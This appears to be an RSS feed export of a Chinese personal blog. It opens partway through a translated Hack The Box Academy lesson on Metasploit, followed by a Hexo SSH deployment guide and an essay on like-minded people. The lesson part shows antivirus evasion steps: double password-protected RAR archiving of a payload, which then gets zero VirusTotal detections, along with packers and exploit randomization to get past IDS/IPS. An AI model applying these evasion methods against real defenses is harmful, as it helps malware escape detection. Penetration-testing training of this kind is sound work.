-?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test.rar</span><br><span class="line">Adding    test.js                                                     OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p> 存档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test.js   test.rar</span><br></pre></td></tr></table></figure><h4 id="删除-RAR-扩展名"><a href="#删除-RAR-扩展名" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test.rar test</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test.js</span><br></pre></td></tr></table></figure><h4 id="再次归档有效负载"><a href="#再次归档有效负载" class="headerlink" title="再次归档有效负载"></a>再次归档有效负载</h4><p> 再次归档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ rar a test2.rar -p test</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar -?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test2.rar</span><br><span class="line">Adding    test                                                        OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure><h4 id="删除-RAR-扩展名-1"><a href="#删除-RAR-扩展名-1" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test2.rar test2</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test2   test.js</span><br></pre></td></tr></table></figure><p>test2 文件是最终的 .rar 存档文件，其扩展名 (.rar) 从名称中删除。之后，我们可以继续将其上传到 VirusTotal 以进行另一次检查。</p><h4 id="病毒总数-1"><a href="#病毒总数-1" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test2</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test2...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d</span><br><span class="line">[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429</span><br><span class="line">[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167804</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">=================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version         Result  Update</span><br><span class="line"> ---------             --------  -------         ------  ------</span><br><span class="line"> ALYac                 false     1.1.3.1                 20220510</span><br><span class="line"> Acronis               false     1.2.0.108               20220426</span><br><span class="line"> Ad-Aware              false     3.0.21.193              20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230            20220510</span><br><span class="line"> Antiy-AVL             false     3.0                     20220510</span><br><span class="line"> Arcabit               false     1.0.0.889               20220510</span><br><span class="line"> Avira                 false     8.3.3.14                20220510</span><br><span class="line"> BitDefender           false     7.2                     20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0             20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899              20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                   20220510</span><br><span class="line"> CMC                   false     2.10.2019.1             20211026</span><br><span class="line"> ClamAV                false     0.105.0.0               20220509</span><br><span class="line"> Comodo                false     34606                   20220509</span><br><span class="line"> Cynet                 false     4.0.0.27                20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                 20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040             20220510</span><br><span class="line"> ESET-NOD32            false     25243                   20220510</span><br><span class="line"> Emsisoft              false     2021.5.0.7597           20220510</span><br><span class="line"> F-Secure              false     18.10.978.51            20220510</span><br><span class="line"> FireEye               false     35.24.1.0               20220510</span><br><span class="line"> Fortinet              false     6.2.142.0               20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174              20220510</span><br><span class="line"> Jiangmin              false     16.0.100                20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275             20220510</span><br><span class="line"> K7GW                  false     12.12.42275             20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565           20220510</span><br><span class="line"> Lionic                false     7.5                     20220510</span><br><span class="line"> MAX                   false     2019.9.16.1             20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                 20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728          20220510</span><br><span class="line"> MicroWorld-eScan      false     14.0.409.0              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588           20220510</span><br><span class="line"> Panda                 false     4.6.4.2                 20220509</span><br><span class="line"> Rising                false     25.0.0.27               20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032              20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                20220507</span><br><span class="line"> Symantec              false     1.17.0.0                20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02           20220510</span><br><span class="line"> Tencent               false     1.0.0.1                 20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040             20220510</span><br><span class="line"> VBA32                 false     5.0.0                   20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0             20220510</span><br><span class="line"> VirIT                 false     9.5.191                 20220509</span><br><span class="line"> Yandex                false     5.5.2.24                20220428</span><br><span class="line"> Zillya                false     2.0.0.4627              20220509</span><br><span class="line"> ZoneAlarm             false     1.0                     20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                 20220509</span><br></pre></td></tr></table></figure><p><code>to</code>正如我们从上面看到的那样，这是一种在目标主机和目标主机之间传输数据的好方法<code>from</code>。</p><hr><h2 id="包装工"><a href="#包装工" class="headerlink" title="包装工"></a>包装工</h2><p>该术语指的是有效负载与可执行程序和解压缩代码一起打包在一个文件中的过程<code>Packer</code>的结果。<code>executable compression</code>运行时，解压缩代码将后门可执行文件返回到其原始状态，从而为目标主机上的文件扫描机制提供另一层保护。此过程透明地发生，以便压缩的可执行文件以与原始可执行文件相同的方式运行，同时保留所有原始功能。此外，msfvenom 还提供压缩和更改后门可执行文件的文件结构以及加密底层进程结构的能力。</p><p>流行的加壳软件列表：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://upx.github.io/">UPX封隔器</a></td><td><a href="https://enigmaprotector.com/">谜保护者</a></td><td><a href="https://www.matcode.com/mpress.htm">国会议员</a></td></tr><tr><td>备用 EXE 打包程序</td><td>执行隐身</td><td>吗啡</td></tr><tr><td>水电部</td><td>泰米达</td><td></td></tr></tbody></table><p>如果我们想了解有关打包器的更多信息，请查看<a href="https://jon.oberheide.org/files/woot09-polypack.pdf">PolyPack 项目</a>。</p><hr><h2 id="利用编码"><a href="#利用编码" class="headerlink" title="利用编码"></a>利用编码</h2><p>在编写我们的漏洞利用程序或将预先存在的漏洞利用程序移植到框架时，最好确保利用目标系统上实施的安全措施不容易识别漏洞利用代码。</p><p>例如，<code>Buffer Overflow</code>由于其十六进制缓冲区模式，典型的漏洞可能很容易与通过网络传输的常规流量区分开来。IDS &#x2F; IPS 部署可以检查流向目标机器的流量，并注意到用于利用代码的特定过度使用模式。</p><p>在组装我们的漏洞利用代码时，随机化有助于为这些模式添加一些变化，这将破坏众所周知的漏洞利用缓冲区的 IPS &#x2F; IDS 数据库签名。<code>Offset</code>这可以通过在 msfconsole 模块的代码中输入一个开关来完成：</p><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;Targets&#x27;</span> =&gt;</span><br><span class="line">[</span><br><span class="line"> [ <span class="string">&#x27;Windows 2000 SP4 English&#x27;</span>, &#123; <span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x77e14c29</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">5093</span> &#125; ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>除了 BoF 代码之外，应该始终避免使用明显的 NOP sled，在溢出完成后 shellcode 应该着陆的地方。请注意，BoF 代码的目的是使目标机器上运行的服务崩溃，而 NOP sled 是插入我们的 shellcode（有效负载）的分配内存。IPS&#x2F;IDS 实体会定期检查这两者，因此最好在将我们的自定义漏洞代码部署到客户端网络之前针对沙箱环境测试它。当然，我们可能只有一次机会在评估期间正确地做到这一点。</p><p>有关利用代码的更多信息，我们建议您查看No Starch 出版社的<a href="https://nostarch.com/metasploit">Metasploit - 渗透测试指南。</a>他们深入研究了有关为框架创建漏洞的一些细节。</p><hr><h2 id="从源代码重新编译-Meterpreter"><a href="#从源代码重新编译-Meterpreter" class="headerlink" title="从源代码重新编译 Meterpreter"></a>从源代码重新编译 Meterpreter</h2><p>入侵防御系统和防病毒引擎是最常见的防御工具，可以击落目标的初始立足点。这些主要作用于整个恶意文件或存根阶段的签名。</p><hr><h2 id="关于逃避的注意事项"><a href="#关于逃避的注意事项" class="headerlink" title="关于逃避的注意事项"></a>关于逃避的注意事项</h2><p>本节涵盖高级别的规避。请留意后面的模块，这些模块将更深入地挖掘更有效地执行规避所需的理论和实践知识。值得在较旧的 HTB 机器上尝试其中的一些技术，或者安装带有较旧版本的 Windows Defender 或免费 AV 引擎的 VM，并练习规避技巧。这是一个庞大的主题，无法在单个部分中充分涵盖。</p><p><a href="https://academy.hackthebox.com/module/39/section/418">以前的</a>标记完成和下一步<a href="https://academy.hackthebox.com/module/39/section/493">下一个</a></p><p>备忘单</p><h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h6><p><a href="https://academy.hackthebox.com/module/39/section/381">前言</a><a href="https://academy.hackthebox.com/module/39/section/383">Metasploit简介</a><a href="https://academy.hackthebox.com/module/39/section/384">MSF控制台介绍</a></p><h6 id="MSF-组件"><a href="#MSF-组件" class="headerlink" title="MSF 组件"></a>MSF 组件</h6><p><a href="https://academy.hackthebox.com/module/39/section/404"> 模块</a><a href="https://academy.hackthebox.com/module/39/section/408">目标</a><a href="https://academy.hackthebox.com/module/39/section/407"> 有效载荷</a><a href="https://academy.hackthebox.com/module/39/section/409">编码器</a><a href="https://academy.hackthebox.com/module/39/section/411">数据库</a><a href="https://academy.hackthebox.com/module/39/section/413">插件和混合</a></p><h6 id="无国界医生会议"><a href="#无国界医生会议" class="headerlink" title="无国界医生会议"></a>无国界医生会议</h6><p><a href="https://academy.hackthebox.com/module/39/section/415"> 会议和工作</a><a href="https://academy.hackthebox.com/module/39/section/414"> 计价器</a></p><h6 id="附加功能"><a href="#附加功能" class="headerlink" title="附加功能"></a>附加功能</h6><p><a href="https://academy.hackthebox.com/module/39/section/417">编写和导入模块</a><a href="https://academy.hackthebox.com/module/39/section/418">MSF毒液简介</a><a href="https://academy.hackthebox.com/module/39/section/416">防火墙和 IDS&#x2F;IPS 规避</a><a href="https://academy.hackthebox.com/module/39/section/493">Metasploit 框架更新 - 2020 年 8 月</a></p><h5 id="我的工作站"><a href="#我的工作站" class="headerlink" title="我的工作站"></a>我的工作站</h5><h1 id="Metasploit-框架更新-2020-年-8-月"><a href="#Metasploit-框架更新-2020-年-8-月" class="headerlink" title="Metasploit 框架更新 - 2020 年 8 月"></a>Metasploit 框架更新 - 2020 年 8 月</h1><hr><p>更新到 MSF6 将使所有以前的负载会话无法使用（如果它们是使用 MSF5 建立的）。此外，使用 MSF5 生成的有效负载将不适用于 MSF6 通信机制。我们在下面总结了 2020 年 8 月 MSF 控制台更新带来的更改和添加。</p><hr><h2 id="生成特征"><a href="#生成特征" class="headerlink" title="生成特征"></a>生成特征</h2><ul><li>所有五种实现（Windows、Python、Java、Mettle 和 PHP）的跨 Meterpreter 会话的端到端加密</li><li>SMBv3 客户端支持以进一步启用现代开发工作流程</li><li>Windows shellcode 的新多态负载生成例程，可提高针对常见防病毒和入侵检测系统 (IDS) 产品的规避能力</li></ul><hr><h2 id="扩展加密"><a href="#扩展加密" class="headerlink" title="扩展加密"></a>扩展加密</h2><ul><li>为某些网络操作和 Metasploit 的主要有效载荷二进制文件创建基于签名的检测的复杂性增加</li><li>在攻击者和目标系统之间的通信期间，所有 Meterpreter 有效负载将使用 AES 加密</li><li>SMBv3 加密集成将增加用于识别通过 SMB 执行的关键操作的基于签名的检测的复杂性</li></ul><hr><h2 id="更清洁的有效载荷工件"><a href="#更清洁的有效载荷工件" class="headerlink" title="更清洁的有效载荷工件"></a>更清洁的有效载荷工件</h2><ul><li>Windows Meterpreter 使用的 DLL 现在通过序号而不是名称解析必要的函数</li><li>反射加载 DLL 使用的标准导出 ReflectiveLoader 不再作为文本数据出现在负载二进制文件中</li><li>Meterpreter 向框架公开的命令现在被编码为整数而不是字符串</li></ul><hr><h2 id="插件-2"><a href="#插件-2" class="headerlink" title="插件"></a>插件</h2><p>旧的 Mimikatz Meterpreter 扩展被移除，取而代之的是它的继任者 Kiwi。因此，在可预见的未来，加载 Mimikatz 的尝试将加载 Kiwi。</p><hr><h2 id="有效载荷-1"><a href="#有效载荷-1" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>将 shellcode 静态生成例程替换为随机化例程，该例程通过每次随机化指令向该关键存根添加多态属性。要阅读有关这些更改的更多信息并查看完整的更改日志，请<a href="https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/">点击此链接</a>。</p><hr><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>正如我们在本模块中看到的，Metasploit 是一个强大的框架。虽然经常被误用和贴错标签，但如果使用得当，它可以成为我们渗透测试武器库的重要组成部分。它具有高度可扩展性，非常适合在评估期间跟踪数据，并且非常适合后期开发和促进枢转。值得尝试 Metasploit 提供的所有功能；您可能会找到一种非常适合您的工作流程的方式。如果你想避免它，那也没关系！那里有很多工具，我们应该使用我们最熟悉的工具。要使用此工具进行更多练习，请查看本模块末尾标记的 HTB 盒子，或使用 Metasploit 尝试任何盒子或 Academy 模块目标。您还可以在 Dante Pro Lab 中练习它（尤其是它的旋转能力）。</p><p><a href="https://academy.hackthebox.com/module/39/section/416">以前的</a>结束</p><p>备忘单</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Author: Answer_77&lt;br&gt;本文来源：&lt;a href=&quot;https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/&quot;&gt;htt</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://touristdaughter.cyou/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="http://touristdaughter.cyou/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/HTB/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo使用SSH连接GitHub</title>
    <link href="http://touristdaughter.cyou/2024/04/09/Hexo%E4%BD%BF%E7%94%A8SSH%E8%BF%9E%E6%8E%A5GitHub/"/>
    <id>http://touristdaughter.cyou/2024/04/09/Hexo%E4%BD%BF%E7%94%A8SSH%E8%BF%9E%E6%8E%A5GitHub/</id>
    <published>2024-04-09T15:06:30.131Z</published>
    <updated>2024-04-09T15:24:54.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo使用SSH连接GitHub"><a href="#Hexo使用SSH连接GitHub" class="headerlink" title="Hexo使用SSH连接GitHub"></a>Hexo使用SSH连接GitHub</h1><p>步骤：</p><h2 id="1-设置全局变量"><a href="#1-设置全局变量" class="headerlink" title="1.设置全局变量"></a>1.设置全局变量</h2><h3 id="查看Git环境所有配置"><a href="#查看Git环境所有配置" class="headerlink" title="查看Git环境所有配置"></a>查看Git环境所有配置</h3><p>Win+R打开命令行窗口，并输入以下代码：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure><p>如果没有配置<code>user.name</code>和<code>user.email</code>则需要先配置</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;用户名随意&quot;</span><br><span class="line">git config --global user.email  &quot;<span class="number">123456</span>@qq.com&quot; #填写github注册的邮箱</span><br></pre></td></tr></table></figure><h2 id="2-查看SSH-Key"><a href="#2-查看SSH-Key" class="headerlink" title="2.查看SSH Key"></a>2.查看SSH Key</h2><p>在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh </span><br><span class="line">ls </span><br></pre></td></tr></table></figure><h2 id="3-生成密钥"><a href="#3-生成密钥" class="headerlink" title="3.生成密钥"></a>3.生成密钥</h2><p>在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub #查看公钥并复制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;你的github邮箱&quot; #没有的话执行此命令生成公钥和私钥</span><br></pre></td></tr></table></figure><h2 id="4-复制密钥到github"><a href="#4-复制密钥到github" class="headerlink" title="4.复制密钥到github"></a>4.复制密钥到github</h2><p>打开github，点击setting &gt;SSH and GPG keys &gt;New SSH key，取个名字，粘贴密钥即可</p><p>验证是否配置成功:在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com #打开git bash输入此命令，显示successful表示成功</span><br></pre></td></tr></table></figure><p>修改hexo的配置文件.config.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:   #部署部分的设置</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:你的用户名/你的仓库名.git  #设置仓库为ssh格式</span><br><span class="line">  branch: master </span><br></pre></td></tr></table></figure><p>再次通过hexo g -d 提交博客代码时就不用输入密码了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo使用SSH连接GitHub&quot;&gt;&lt;a href=&quot;#Hexo使用SSH连接GitHub&quot; class=&quot;headerlink&quot; title=&quot;Hexo使用SSH连接GitHub&quot;&gt;&lt;/a&gt;Hexo使用SSH连接GitHub&lt;/h1&gt;&lt;p&gt;步骤：&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="http://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="GitHub" scheme="http://touristdaughter.cyou/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>同频共振：知识背景与团结力量</title>
    <link href="http://touristdaughter.cyou/2024/04/06/%E5%90%8C%E9%A2%91%E5%85%B1%E6%8C%AF%EF%BC%9A%E7%9F%A5%E8%AF%86%E8%83%8C%E6%99%AF%E4%B8%8E%E5%9B%A2%E7%BB%93%E5%8A%9B%E9%87%8F/"/>
    <id>http://touristdaughter.cyou/2024/04/06/%E5%90%8C%E9%A2%91%E5%85%B1%E6%8C%AF%EF%BC%9A%E7%9F%A5%E8%AF%86%E8%83%8C%E6%99%AF%E4%B8%8E%E5%9B%A2%E7%BB%93%E5%8A%9B%E9%87%8F/</id>
    <published>2024-04-06T12:37:37.775Z</published>
    <updated>2024-04-09T14:28:33.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同频共振：知识背景与团结力量"><a href="#同频共振：知识背景与团结力量" class="headerlink" title="同频共振：知识背景与团结力量"></a>同频共振：知识背景与团结力量</h1><h2 id="一、同频共振的现象"><a href="#一、同频共振的现象" class="headerlink" title="一、同频共振的现象"></a>一、同频共振的现象</h2><p>共振现象，又称同频共振，是一种在同频条件下，个体之间产生高度共鸣和理解的现象。在同频共振中，参与者<code>具有相似的知识背景</code>、<code>相近的专业技能和水平</code>，这使得他们能够<code>轻松地理解彼此的想法和行为</code>。这种现象在游戏玩家之间尤为明显，因为他们共同经历过相同的游戏过程，掌握相似的游戏技巧。</p><p>当这些具备同频共振的人一起玩游戏时，他们会产生一种<code>独特的沟通方式</code>。这种沟通方式是基于他们对游戏的深刻理解和丰富经验，使得他们在很大程度上不需要言语交流，就能心领神会对方的意图。这种默契源于他们<code>对游戏规则的熟悉</code>、<code>对角色定位的明确</code>以及对<code>对方行为模式的洞察</code>。</p><p>在同频共振的群体中，成员之间的互动往往更加<code>高效</code>。他们可以<code>迅速地分析局势</code>，<code>预判对方的行为</code>，并据此<code>采取相应的行动</code>。这种高效互动使得他们在游戏中更容易取得成功，实现<code>双赢</code>。</p><p>同频共振现象也在其他领域中存在。例如，在职场、学术圈或兴趣爱好中，<code>具备相同背景和技能的人们</code>同样可以形成<code>紧密的合作关系</code>，从而<code>提高工作效率和成果质量</code>。</p><p>在同频共振的现象中，我们可以观察到一种特殊的感觉。这种感觉难以言表，但却是我们识别出同类时会产生的<code>本能反应</code>。例如，<code>学过算法的程序员们</code>具备<code>扎实的计算机基础知识和编程能力</code>、<code>强烈的团队协作精神和沟通能力</code>、<code>优秀的解决问题能力和创新思维</code>。他们能够<code>快速地分析问题</code>，<code>找到解决方案</code>，并<code>在关键时刻提出新颖的解题方法</code>。同样，<code>网络安全领域的人</code>拥有<code>深入的网络安全知识和技能</code>、<code>敏锐的洞察力和风险评估能力</code>、<code>高效的团队协作和沟通能力</code>、<code>持续学习和自我提升意识</code>，以及<code>严谨的职业道德和法律意识</code>。并且，程序员们在谈论算法时，能迅速地找到共同话题，分享彼此的见解和心得。再如，网络安全领域的专家们在交流时，能凭借相同的知识背景迅速理解对方的观点，形成紧密的联系。这些现象都表明，同频共振是基于认知范围、知识背景的交集而产生的。</p><p>当具备共同特点或类似知识背景的同类型人相遇时，他们会在对方身上感受到这种特殊的感觉。这种感觉说不上来，但却是我们识别出同类时会产生的真实感受。正因为这种难以言表的感觉，同类人们更容易团结在一起，齐心协力，实现更大的价值和成就。在同频共振的基础上，人们可以相互支持、共同进步，不断拓展知识的边界，创新思维，为个人和社会的进步贡献力量。</p><p>要<code>实现同频共振</code>，首先需要个体之间的<code>相互理解和尊重</code>。在这个过程中，他们需要花费时间和精力去了解对方的<code>思维方式</code>、<code>行为模式</code>以及<code>价值观</code>。此外，<code>不断丰富自己的知识和技能</code>也是关键，这样才能更好地与他人形成<code>共鸣</code>。</p><h2 id="二、同频共振的原因"><a href="#二、同频共振的原因" class="headerlink" title="二、同频共振的原因"></a>二、同频共振的原因</h2><p>同频共振背后的原因是<code>人类的认知结构和知识体系</code>。人们通过学习、实践和经验积累，形成了各自独特的<code>认知范围</code>和<code>知识背景</code>。当具有相似认知范围和知识背景的人相遇时，他们能更容易地理解对方，产生共鸣。这种共鸣不仅体现在<code>思想交流</code>上，还表现在<code>行为模式、价值观念</code>等方面。</p><h2 id="三、同频共振背后的团结力量"><a href="#三、同频共振背后的团结力量" class="headerlink" title="三、同频共振背后的团结力量"></a>三、同频共振背后的团结力量</h2><p>同频共振为同类人提供了一个<code>相互支持</code>、<code>共同进步</code>的平台。在这个平台上，人们可以共享资源、交流心得，取长补短。这种团结力量具有以下几个特点：</p><h3 id="1-相互理解："><a href="#1-相互理解：" class="headerlink" title="1.  相互理解："></a>1.  相互理解：</h3><p>同类人之间的共鸣让他们更容易理解对方的处境和需求，从而形成<code>深厚的情感纽带</code>。</p><h3 id="2-共同进步："><a href="#2-共同进步：" class="headerlink" title="2.  共同进步："></a>2.  共同进步：</h3><p>在同频共振的基础上，人们可以<code>相互学习、共同成长</code>，实现知识和能力的不断提升。</p><h3 id="3-合作共赢："><a href="#3-合作共赢：" class="headerlink" title="3.  合作共赢："></a>3.  合作共赢：</h3><p>具有相似知识背景的人更容易形成<code>默契</code>，实现<code>团队合作</code>，从而<code>实现共同的目标</code>。</p><h3 id="4-传承创新："><a href="#4-传承创新：" class="headerlink" title="4.  传承创新："></a>4.  传承创新：</h3><p>同频共振使得知识、技能和价值观得以<code>传承和发扬</code>，<code>为人类的进步提供了源源不断的动力</code>。</p><h2 id="四、结论"><a href="#四、结论" class="headerlink" title="四、结论"></a>四、结论</h2><p>同频共振作为一种社会现象，揭示了人类社会中<code>同类相聚</code>、<code>共进共赢</code>的规律。它源于人们的<code>认知范围</code>和<code>知识背景</code>的<code>交集</code>，为同类人提供了一个<code>相互支持、共同进步</code>的平台。在这个平台上，人们可以充分发挥<code>团结力量</code>，实现<code>更大的价值和成就</code>。因此，我们应当重视同频共振的作用，努力寻求与他人的共鸣，以实现<code>个人与社会的共同发展</code>。</p><p>总之，同频共振现象是一种强大的社会凝聚力，它使人们在相互理解和支持的基础上实现高效合作。这种现象在游戏、职场和其他领域中都具有重要意义，因为它有助于提高团队协作的质量和效果。通过培养自己的知识和技能，以及尊重和理解他人，我们可以更好地融入共振群体，共同创造价值。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;同频共振：知识背景与团结力量&quot;&gt;&lt;a href=&quot;#同频共振：知识背景与团结力量&quot; class=&quot;headerlink&quot; title=&quot;同频共振：知识背景与团结力量&quot;&gt;&lt;/a&gt;同频共振：知识背景与团结力量&lt;/h1&gt;&lt;h2 id=&quot;一、同频共振的现象&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站</title>
